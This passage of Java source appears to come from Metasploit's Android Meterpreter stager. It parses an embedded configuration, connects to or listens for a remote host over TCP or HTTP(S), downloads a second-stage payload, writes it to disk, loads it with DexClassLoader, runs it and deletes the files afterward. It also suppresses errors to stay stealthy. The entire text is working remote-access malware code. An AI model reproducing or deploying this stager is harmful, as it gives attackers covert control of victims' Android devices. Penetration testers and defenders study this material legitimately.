    public static long session_expiry;
    public static long comm_timeout;
    public static long retry_total;
    public static long retry_wait;
    public static byte[] cert_hash;

    private static Object[] parameters;

    public static void start(Context context) {
        startInPath(context.getFilesDir().toString());
    }

    public static void startAsync() {
        new Thread() {
            @Override
            public void run() {
                // Execute the payload
                Payload.main(null);
            }
        }.start();
    }

    public static void startInPath(String path) {
        parameters = new Object[]{ path , configBytes };
        startAsync();
    }

    public static void main(String[] args) {
        if (args != null) {
            File currentDir = new File(".");
            String path = currentDir.getAbsolutePath();
            parameters = new Object[]{ path , configBytes };
        }
        long sessionExpiry;
        long commTimeout;
        long retryTotal;
        long retryWait;

        // socket handle is 4 bytes, followed by exit func, both of
        // which we ignore.
        int csr = 8;

        sessionExpiry = unpack32(configBytes, csr);
        csr += 4;
        byte[] uuid = readBytes(configBytes, csr, UUID_LEN);
        csr += UUID_LEN;
        String url = readString(configBytes, csr, URL_LEN);
        csr += URL_LEN;
        commTimeout = unpack32(configBytes, csr);
        csr += 4;
        retryTotal = unpack32(configBytes, csr);
        csr += 4;
        retryWait = unpack32(configBytes, csr);
        csr += 4;
        byte[] certHash = readBytes(configBytes, 2192, CERT_HASH_LEN);
        for (byte hashByte : certHash) {
            if (hashByte != 0) {
                cert_hash = certHash;
                break;
            }
        }

        long currentTime = System.currentTimeMillis();
        long payloadStart = currentTime;
        session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
        comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
        retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
        retry_wait = TimeUnit.SECONDS.toMillis(retryWait);

        while (currentTime <= payloadStart + retry_total &&
            currentTime <= session_expiry) {
            try {
                if (url.startsWith("tcp")) {
                    runStagefromTCP(url);
                } else {
                    runStageFromHTTP(url);
                }
                break;
            } catch (Exception e) {
                // Avoid printing extensive backtraces when we are trying to be
                // stealty. An optional runtime or staging-time switch would be
                // good to have here, like Python Meterpreter's debug option.
                // e.printStackTrace();
            }
            try {
                Thread.sleep(retry_wait);
            } catch (InterruptedException e) {
              break;
            }
            currentTime = System.currentTimeMillis();
        }
    }

    private static String readString(byte[] bytes, int offset, int size) {
        byte[] bytesRead = readBytes(bytes, offset, size);
        try {
            return new String(bytesRead, "ISO-8859-1").trim();
        }
        catch (UnsupportedEncodingException ex) {
            // fallback to no encoding
            return new String(bytesRead).trim();
        }
    }

    private static byte[] readBytes(byte[] bytes, int offset, int size) {
        byte[] buf = new byte[size];
        System.arraycopy(bytes, offset, buf, 0, size);
        return buf;
    }

    private static int unpack32(byte[] bytes, int offset) {
        int res = 0;
        for (int i = 0; i < 4; i++) {
          res = res | (((int)bytes[i + offset]) & 0xFF) << (i * 8);
        }
        return res;
    }


    private static void runStageFromHTTP(String url) throws Exception {
        InputStream inStream;
        if (url.startsWith("https")) {
            URLConnection uc = new URL(url).openConnection();
            PayloadTrustManager.useFor(uc, cert_hash);
            inStream = uc.getInputStream();
        } else {
            inStream = new URL(url).openStream();
        }
        OutputStream out = new ByteArrayOutputStream();
        DataInputStream in = new DataInputStream(inStream);
        runNextStage(in, out, parameters);
    }

    private static void runStagefromTCP(String url) throws Exception {
        // string is in the format:   tcp://host:port
        String[] parts = url.split(":");
        int port = Integer.parseInt(parts[2]);
        String host = parts[1].split("/")[2];
        Socket sock = null;

        if (host.equals("")) {
            ServerSocket server = new ServerSocket(port);
            sock = server.accept();
            server.close();
        } else {
            sock = new Socket(host, port);
        }

        if (sock != null) {
            DataInputStream in = new DataInputStream(sock.getInputStream());
            OutputStream out = new DataOutputStream(sock.getOutputStream());
            runNextStage(in, out, parameters);
        }
    }

    private static void runNextStage(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
        try {
            Class<?> existingClass = Payload.class.getClassLoader().
                    loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
            existingClass.getConstructor(new Class[]{
                    DataInputStream.class, OutputStream.class, Object[].class, boolean.class
            }).newInstance(in, out, parameters, false);
        } catch (ClassNotFoundException e) {
            String path = (String) parameters[0];
            String filePath = path + File.separatorChar + "payload.jar";
            String dexPath = path + File.separatorChar + "payload.dex";

            // Read the class name
            int coreLen = in.readInt();
            byte[] core = new byte[coreLen];
            in.readFully(core);
            String classFile = new String(core);

            // Read the stage
            coreLen = in.readInt();
            core = new byte[coreLen];
            in.readFully(core);

            File file = new File(filePath);
            if (!file.exists()) {
                file.createNewFile();
            }
            FileOutputStream fop = new FileOutputStream(file);
            fop.write(core);
            fop.flush();
            fop.close();

            // Load the stage
            DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
                    Payload.class.getClassLoader());
            Class<?> myClass = classLoader.loadClass(classFile);
            final Object stage = myClass.newInstance();
            file.delete();
            new File(dexPath).delete();
            myClass.getMethod("start",
                    new Class[]{DataInputStream.class, OutputStream.class, Object[].class})
                    .invoke(stage, in, out, parameters);
        }

        session_expiry = -1;
    }
